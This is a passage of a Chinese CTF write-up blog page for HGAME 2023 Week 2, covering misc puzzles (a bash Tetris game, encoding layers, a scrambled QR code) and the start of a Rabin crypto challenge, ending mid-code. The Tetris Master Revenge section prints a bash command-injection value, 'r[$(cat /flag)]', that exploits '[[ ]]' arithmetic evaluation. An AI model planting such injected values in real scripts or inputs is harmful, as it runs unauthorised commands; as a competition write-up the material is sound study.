<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>HGAME 2023 Week 2 | Lazzaro</title><meta name="description" content="​     HGAME 2023 将于 1 月 5 日 20:00 正式开始，祝大家玩得开心 :-)线上赛平台：https:&#x2F;&#x2F;hgame.vidar.club请尽快注册，注册时请选择校外选手，注册将于 1 月 12 日 20:00 关闭本次比赛的奖励事宜以及赛后沟通反馈以邮件为主，请各位使用真实的邮件地址比赛奖金(针对校外榜)：第1名：1000Pwnhub金币第2名：800Pwnhub金币第3名"><meta property="og:type" content="article"><meta property="og:title" content="HGAME 2023 Week 2"><meta property="og:url" content="https://lazzzaro.github.io/2023/01/20/match-HGAME-2023-Week-2/index.html"><meta property="og:site_name" content="Lazzaro"><meta property="og:description" content="​     HGAME 2023 将于 1 月 5 日 20:00 正式开始，祝大家玩得开心 :-)线上赛平台：https:&#x2F;&#x2F;hgame.vidar.club请尽快注册，注册时请选择校外选手，注册将于 1 月 12 日 20:00 关闭本次比赛的奖励事宜以及赛后沟通反馈以邮件为主，请各位使用真实的邮件地址比赛奖金(针对校外榜)：第1名：1000Pwnhub金币第2名：800Pwnhub金币第3名"><meta property="og:locale" content="zh_CN"><meta property="article:published_time" content="2023-01-20T09:25:16.000Z"><meta property="article:modified_time" content="2023-01-20T11:58:46.830Z"><meta property="article:author" content="Lazzaro"><meta property="article:tag" content="2023赛"><meta name="twitter:card" content="summary"><link rel="canonical" href="https://lazzzaro.github.io/2023/01/20/match-HGAME-2023-Week-2/index.html"><link rel="alternate" href="/atom.xml" title="Lazzaro" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link href="https://cdn.jsdelivr.net/npm/katex@0.9.0/dist/katex.min.css" rel="stylesheet"><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id:"3Ft5J9t2Jl0eb5Zr",ck:"3Ft5J9t2Jl0eb5Zr",hashMode:!0})</script><meta name="generator" content="Hexo 7.0.0"></head><body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/Lazzzaro" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">Lazzaro</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md">CTF弱鸡自进阶</h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> flag{}___Orz</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="搜索"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">总览</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">汇总</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">类别</span></a></li><li class="menu-item menu-item-tags"><a href="/tags"><i class="icon icon-tags"></i> <span class="menu-title">关键词</span></a></li><li class="menu-item menu-item-guestbook"><a href="/guestbook"><i class="icon"></i> <span class="menu-title">来留个言 👉👉👉</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">类别</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/crypto/">crypto</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/match/">match</a><span class="category-list-count">50</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/misc/">misc</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/other/">other</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">17</span></li></ul></div></div><div class="widget"><h3 class="widget-title">关键词云</h3><div class="widget-body tagcloud"><a href="/tags/2020%E8%B5%9B/" style="font-size:14px">2020赛</a> <a href="/tags/2021%E8%B5%9B/" style="font-size:13.86px">2021赛</a> <a href="/tags/2022%E8%B5%9B/" style="font-size:13.57px">2022赛</a> <a href="/tags/2023%E8%B5%9B/" style="font-size:13.71px">2023赛</a> <a href="/tags/2024%E8%B5%9B/" style="font-size:13.29px">2024赛</a> <a href="/tags/2025%E8%B5%9B/" style="font-size:13px">2025赛</a> <a href="/tags/AES/" style="font-size:13px">AES</a> <a href="/tags/Android/" style="font-size:13px">Android</a> <a href="/tags/Bash/" style="font-size:13px">Bash</a> <a href="/tags/CMS/" style="font-size:13px">CMS</a> <a href="/tags/CSRF/" style="font-size:13px">CSRF</a> <a href="/tags/DES/" style="font-size:13px">DES</a> <a href="/tags/ECC/" style="font-size:13px">ECC</a> <a href="/tags/IDA/" style="font-size:13px">IDA</a> <a href="/tags/JWT/" style="font-size:13px">JWT</a> <a href="/tags/Java/" style="font-size:13.14px">Java</a> <a href="/tags/Linux/" style="font-size:13px">Linux</a> <a href="/tags/OT/" style="font-size:13px">OT</a> <a href="/tags/PHP/" style="font-size:13.29px">PHP</a> <a href="/tags/RCE/" style="font-size:13px">RCE</a> <a href="/tags/RSA/" style="font-size:13.14px">RSA</a> <a href="/tags/SQL/" style="font-size:13px">SQL</a> <a href="/tags/SSRF/" style="font-size:13px">SSRF</a> <a href="/tags/SSTI/" style="font-size:13px">SSTI</a> <a href="/tags/Sage/" style="font-size:13px">Sage</a> <a href="/tags/USB/" style="font-size:13px">USB</a> <a href="/tags/Unity/" style="font-size:13px">Unity</a> <a href="/tags/WebAssembly/" style="font-size:13px">WebAssembly</a> <a href="/tags/XSS/" style="font-size:13px">XSS</a> <a href="/tags/XXE/" style="font-size:13px">XXE</a> <a href="/tags/angr/" style="font-size:13px">angr</a> <a href="/tags/fuzz/" style="font-size:13px">fuzz</a> <a href="/tags/gmpy2/" style="font-size:13px">gmpy2</a> <a href="/tags/hash/" style="font-size:13px">hash</a> <a href="/tags/js/" style="font-size:13px">js</a> <a href="/tags/node-js/" style="font-size:13.14px">node.js</a> <a href="/tags/pwntools/" style="font-size:13px">pwntools</a> <a href="/tags/python/" style="font-size:13.43px">python</a> <a href="/tags/wasm/" style="font-size:13px">wasm</a> <a href="/tags/z3/" style="font-size:13px">z3</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size:13px">内网</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size:13px">反序列化</a> <a href="/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/" style="font-size:13px">反编译</a> <a href="/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/" style="font-size:13px">反调试</a> <a href="/tags/%E5%8F%96%E8%AF%81/" style="font-size:13px">取证</a> <a href="/tags/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/" style="font-size:13px">后量子密码</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" style="font-size:13px">命令行</a> <a href="/tags/%E5%9B%BE%E5%83%8F/" style="font-size:13px">图像</a> <a href="/tags/%E5%9D%97%E5%AF%86%E7%A0%81/" style="font-size:13px">块密码</a> <a href="/tags/%E5%A0%86/" style="font-size:13px">堆</a> <a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size:13.14px">密码</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size:13px">提权</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size:13px">文件上传</a> <a href="/tags/%E6%9B%B2%E7%BA%BF/" style="font-size:13px">曲线</a> <a href="/tags/%E6%A0%88/" style="font-size:13px">栈</a> <a href="/tags/%E6%A0%BC%E5%AF%86%E7%A0%81/" style="font-size:13px">格密码</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size:13px">格式化字符串</a> <a href="/tags/%E6%B3%A8%E5%85%A5/" style="font-size:13px">注入</a> <a href="/tags/%E6%B5%81%E5%AF%86%E7%A0%81/" style="font-size:13px">流密码</a> <a href="/tags/%E6%B5%81%E9%87%8F/" style="font-size:13px">流量</a> <a href="/tags/%E6%B7%B7%E6%B7%86/" style="font-size:13px">混淆</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size:13px">渗透</a> <a href="/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/" style="font-size:13px">离散对数</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size:13.14px">算法</a> <a href="/tags/%E7%BB%95%E8%BF%87/" style="font-size:13.43px">绕过</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size:13px">编码</a> <a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size:13.14px">脚本</a> <a href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" style="font-size:13px">自动化</a> <a href="/tags/%E9%80%83%E9%80%B8/" style="font-size:13px">逃逸</a> <a href="/tags/%E9%9A%90%E5%86%99/" style="font-size:13.29px">隐写</a></div></div><div class="widget"><h3 class="widget-title">汇总</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/06/">六月 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">十二月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">十一月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">三月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">十一月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">九月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">五月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">二月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">一月 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">十二月 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">十一月 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">九月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">七月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">五月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">九月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">八月 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">二月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">十一月 2020</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a><span class="archive-list-count">24</span></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">文章目录</h3><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tetris-Master"><span class="toc-number">1.1.</span> <span class="toc-text">Tetris Master</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tetris-Master-Revenge"><span class="toc-number">1.2.</span> <span class="toc-text">Tetris Master Revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sign-In-Pro-Max"><span class="toc-number">1.3.</span> <span class="toc-text">Sign In Pro Max</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crazy-qrcode"><span class="toc-number">1.4.</span> <span class="toc-text">crazy_qrcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Rabin"><span class="toc-number">2.1.</span> <span class="toc-text">Rabin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA-%E5%A4%A7%E5%86%92%E9%99%A91"><span class="toc-number">2.2.</span> <span class="toc-text">RSA 大冒险1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E9%87%8C%E6%9C%89%E4%BB%80%E4%B9%88"><span class="toc-number">2.3.</span> <span class="toc-text">包里有什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9B%B6%E5%85%83%E8%B4%AD%E5%B9%B4%E8%B4%A7%E5%95%86%E5%BA%97"><span class="toc-number">2.4.</span> <span class="toc-text">零元购年货商店</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Git-Leakage"><span class="toc-number">3.1.</span> <span class="toc-text">Git Leakage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#v2board"><span class="toc-number">3.2.</span> <span class="toc-text">v2board</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Search-Commodity"><span class="toc-number">3.3.</span> <span class="toc-text">Search Commodity</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Designer"><span class="toc-number">3.4.</span> <span class="toc-text">Designer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">4.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#before-main"><span class="toc-number">4.1.</span> <span class="toc-text">before_main</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stream"><span class="toc-number">4.2.</span> <span class="toc-text">stream</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#math"><span class="toc-number">4.3.</span> <span class="toc-text">math</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VidarCamera"><span class="toc-number">4.4.</span> <span class="toc-text">VidarCamera</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">5.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#YukkuriSay"><span class="toc-number">5.1.</span> <span class="toc-text">YukkuriSay</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fast-note"><span class="toc-number">5.2.</span> <span class="toc-text">fast_note</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Iot"><span class="toc-number">6.</span> <span class="toc-text">Iot</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pirated-router"><span class="toc-number">6.1.</span> <span class="toc-text">Pirated router</span></a></li></ol></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-match-HGAME-2023-Week-2" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">HGAME 2023 Week 2</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2023/01/20/match-HGAME-2023-Week-2/" class="article-date"><time datetime="2023-01-20T09:25:16.000Z" itemprop="datePublished">2023-01-20</time> </a></span><span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/match/">match</a> </span><span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link-link" href="/tags/2023%E8%B5%9B/" rel="tag">2023赛</a> </span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="/2023/01/20/match-HGAME-2023-Week-2/" class="leancloud_visitors" data-flag-title="HGAME 2023 Week 2"><span class="leancloud-visitors-count">∞</span> </span></span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/01/20/match-HGAME-2023-Week-2/#comments" class="article-comment-link">评论</a></span></div></div><div class="article-entry marked-body" itemprop="articleBody"><p>​</p><p>HGAME 2023 将于 1 月 5 日 20:00 正式开始，祝大家玩得开心 :-)<br>线上赛平台：<a target="_blank" rel="noopener" href="https://hgame.vidar.club/">https://hgame.vidar.club</a><br>请尽快注册，注册时请选择校外选手，注册将于 1 月 12 日 20:00 关闭<br>本次比赛的奖励事宜以及赛后沟通反馈以邮件为主，请各位使用真实的邮件地址<br>比赛奖金(针对校外榜)：<br>第1名：1000Pwnhub金币<br>第2名：800Pwnhub金币<br>第3名：600Pwnhub金币<br>4-10名：300Pwnhub金币<br>补充说明：排行榜分数相同者，以先达到该分数的时间次序划定排名，每位获奖选手额外赠送 Pwnhub 邀请码一个<br>注意：<br>* 所有选手均以个人为单位参赛；<br>* 在解题过程中遇到瓶颈或困难可以私聊出题人<br>* 禁止所有破坏比赛公平公正的行为，如：散播或与其他人交换 Flag、解题思路，对平台、参赛者或其他人员进行攻击。违者分数作废并取消比赛资格。<br>* HGAME 线上赛分为四周，每周至官方wp发布前前禁止一切讨论本周题目以及公开自己 wp 的行为。在收集完成后会开放讨论，但仅能讨论已结束的题目。<br>* 每周比赛结束后本周前20名需提交wp到指定邮箱<br>本比赛最终解释权归 Vidar-Team 所有</p><p><strong>Rank: 8</strong></p><hr><p>​</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Tetris-Master"><a href="#Tetris-Master" class="headerlink" title="Tetris Master"></a>Tetris Master</h3><blockquote><p>你是否已经厌倦了普通的游戏题目，对于写脚本玩游戏感到无聊？ 此题你需要能够实现RCE，拿到根目录下的flag，又或者你是真正的Tetris Master？</p><p>请使用ssh进行连接，账号为ctf,密码为hgame，例如ssh ctf@week-2.hgame.lwsec.cn -p port。并且你需要将终端的字体调小，使窗口大小至少为 200 * 70 才能正常进行游戏。</p><p>HINTS:</p><p>题目描述已更新，同时由于存在非预期，题目分数降至50,并上线100分的Revenge版本。</p></blockquote><p>连接：<code>ssh ctf@week-2.hgame.lwsec.cn -p 32150</code></p><p>按 Ctrl+C 强制结束拿到shell，<code>cat flag</code> 得flag：<code>hgame&#123;Bash_Game^Also*Can#Rce&#125;</code>。</p><p>​</p><h3 id="Tetris-Master-Revenge"><a href="#Tetris-Master-Revenge" class="headerlink" title="Tetris Master Revenge"></a>Tetris Master Revenge</h3><blockquote><p>the same as Tetris Master</p></blockquote><p>bash命令执行，参考ByteCTF 2022 - bash_game，在读入 <code>target</code> 值进入 <code>paint_game_over()</code> 内，比较时 <code>[[]]</code> 操作符会造成RCE。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">paint_game_over</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> xcent=$((`tput lines`/<span class="number">2</span>)) ycent=$((`tput cols`/<span class="number">2</span>))</span><br><span class="line">    <span class="built_in">local</span> x=$((xcent-<span class="number">4</span>)) y=$((ycent-<span class="number">25</span>))</span><br><span class="line">    <span class="keyword">for</span> (( i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ )); <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> -ne <span class="string">&quot;\033[<span class="subst">$((x+i)</span>);<span class="variable">$&#123;y&#125;</span>H\033[44m<span class="variable">$&#123;good_game[$i]&#125;</span>\033[0m&quot;</span>;</span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$master</span>&quot;</span> -eq <span class="string">&quot;y&quot;</span> ]] &amp;&amp; [[ <span class="string">&quot;<span class="variable">$score</span>&quot;</span> -gt 50000 ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> -ne <span class="string">&quot;\033[<span class="subst">$((x+3)</span>);<span class="subst">$((ycent+1)</span>)H\033[44m`cat /flag`\033[0m&quot;</span>;</span><br><span class="line">    <span class="keyword">elif</span> [[ <span class="string">&quot;<span class="variable">$master</span>&quot;</span> -ne <span class="string">&quot;y&quot;</span> ]] &amp;&amp; [[ <span class="string">&quot;<span class="variable">$score</span>&quot;</span> -gt <span class="string">&quot;<span class="variable">$target</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> -ne <span class="string">&quot;\033[<span class="subst">$((x+3)</span>);;<span class="subst">$((ycent+1)</span>)H\033[44mKeep Going\033[0m&quot;</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="built_in">echo</span> -ne <span class="string">&quot;\033[<span class="subst">$((x+3)</span>);<span class="subst">$((ycent+1)</span>)H\033[44m<span class="variable">$&#123;score&#125;</span>\033[0m&quot;</span>;</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ssh连接，选择 <code>n</code>，输入目标分数 <code>r[$(cat /flag)]</code>，确认进入游戏，快速结束一局后在结果处以报错形式输出flag：<code>hgame&#123;Bash_Game^Also*Can#Rce^reVenge!!!!&#125;</code>。</p><p>​</p><h3 id="Sign-In-Pro-Max"><a href="#Sign-In-Pro-Max" class="headerlink" title="Sign In Pro Max"></a>Sign In Pro Max</h3><blockquote><p>兔兔没有抢到回家的车票，一个猫猫头像的学长给了他一个候补车票抢票软件，但是这个软件的验证码太难了，你能帮他解一下吗？ flag 英文字母为全小写，自行使用 hgame{}包裹后提交</p></blockquote><p>五个部分：</p><p>Part1：base64+base58+base32，得到 <code>f51d3a18</code>；</p><p>Part2：md5，得到 <code>f91c</code>；</p><p>Part3：sha1，得到 <code>4952</code>；</p><p>Part4：sha256，得到 <code>a3ed</code>；</p><p>Part5：rot21，得到 <code>Part5 is 0bc0ea61d21c, now put all the parts together, don&#39;t forget the format.</code></p><p>按UUID格式连接得flag： <code>hgame&#123;f51d3a18-f91c-4952-a3ed-0bc0ea61d21c&#125;</code>。</p><p>​</p><h3 id="crazy-qrcode"><a href="#crazy-qrcode" class="headerlink" title="crazy_qrcode"></a>crazy_qrcode</h3><blockquote><p>兔兔在买年货,但是看着商家的付款二维码犯了难</p></blockquote><p>png图片的二维码无法扫描，使用<a target="_blank" rel="noopener" href="https://merricx.github.io/qrazybox/">QRazyBox</a>导入，利用自带工具 Brute-force Format Info Pattern 可以得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Decoded Message :</span><br><span class="line">QDjkXkpM0BHNXujs</span><br><span class="line">Error Correction Level : H</span><br><span class="line">Mask Pattern : 4</span><br></pre></td></tr></table></figure><p>使用 <code>QDjkXkpM0BHNXujs</code> 解压zip压缩包，得到25张分割的二维码图片，以及一个25长度的数组。</p><p>1为90°旋转，2为180°旋转，3为270°旋转，0为不旋转，?为需选择其中一个值调整。</p><p>按照5×5拼接好后扫描得到flag：<code>hgame&#123;Cr42y_qrc0de&#125;</code>。</p><p>​</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Rabin"><a href="#Rabin" class="headerlink" title="Rabin"></a>Rabin</h3><blockquote><p>看起来非常像RSA呢。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>(<span class="params">kbits</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(kbits)</span><br><span class="line">        q = getPrime(kbits)</span><br><span class="line">        <span class="keyword">if</span> p % <span class="number">4</span> == <span class="number">3</span> <span class="keyword">and</span> q % <span class="number">4</span>== <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line">p ,q = gen_key(<span class="number">256</span>)</span><br><span class="line">   flag =  <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">   pt = bytes_to_long(flag)</span><br><span class="line">   c = <span class="built_in">pow</span>(pt, <span class="number">2</span>, p*q)</span><br><span class="line">   </span><br><span class="line">   <span class="built_in">print</span>(<span class="string">f&quot;p=<span class="subst">&#123;p&#125;</span>\nq=<span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">f&quot;c=<span class="subst">&#123;<span class="built_in">hex</span>(c)[<span class="number">2</span>:]&#125;</span>&quot;</span>)</span><br><span class="line">   </span><br><span class="line">   <span 